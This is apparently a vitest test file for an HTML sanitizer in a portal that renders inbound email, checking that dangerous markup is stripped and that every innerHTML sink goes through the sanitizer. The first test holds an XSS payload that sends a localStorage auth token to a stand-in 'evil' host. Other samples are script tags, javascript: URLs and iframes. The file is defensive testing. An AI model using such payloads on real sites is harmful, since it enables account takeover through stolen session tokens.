// BF_PORTAL_HTML_SANITIZE_v1 — inbound email HTML is attacker-controlled.
import { describe, expect, it } from "vitest";
import { readFileSync } from "node:fs";
import { join } from "node:path";
import { sanitizeHtml } from "../sanitizeHtml";

describe("sanitizeHtml", () => {
  it("strips the localStorage-token-exfiltration payload", () => {
    const out = sanitizeHtml(`<img src=x onerror="fetch('https://evil/?t='+localStorage.auth_token)">`);
    expect(out).not.toContain("onerror");
    expect(out).not.toContain("localStorage");
  });

  it("strips script tags and javascript: URLs", () => {
    expect(sanitizeHtml("<script>alert(1)</script>")).not.toContain("script");
    expect(sanitizeHtml(`<a href="javascript:alert(1)">x</a>`)).not.toContain("javascript:");
  });

  it("strips iframes, forms and event handlers", () => {
    const out = sanitizeHtml(`<iframe src="https://evil"></iframe><form action="/x"><input></form><div onclick="x()">hi</div>`);
    expect(out).not.toContain("iframe");
    expect(out).not.toContain("<form");
    expect(out).not.toContain("onclick");
  });

  it("keeps legitimate email markup", () => {
    const out = sanitizeHtml(`<p>Hello <strong>Todd</strong></p><a href="https://boreal.financial">link</a>`);
    expect(out).toContain("<strong>");
    expect(out).toContain("https://boreal.financial");
  });

  it("forces links to open safely", () => {
    expect(sanitizeHtml(`<a href="https://x.com">x</a>`)).toContain("noopener");
  });

  it("EVERY innerHTML sink in the portal goes through sanitizeHtml", () => {
    const files = [
      "src/components/email/EmailViewer.tsx",
      "src/pages/communications/CommunicationsPage.tsx",
      "src/components/communications/O365ComposeModal.tsx",
    ];
    for (const f of files) {
      const src = readFileSync(join(process.cwd(), f), "utf-8");
      const sinks = src.split("\n").filter((l) => /dangerouslySetInnerHTML|innerHTML\s*=/.test(l));
      for (const line of sinks) {
        expect(line, `${f}: unsanitized HTML sink -> ${line.trim()}`).toContain("sanitizeHtml");
      }
    }
  });
});
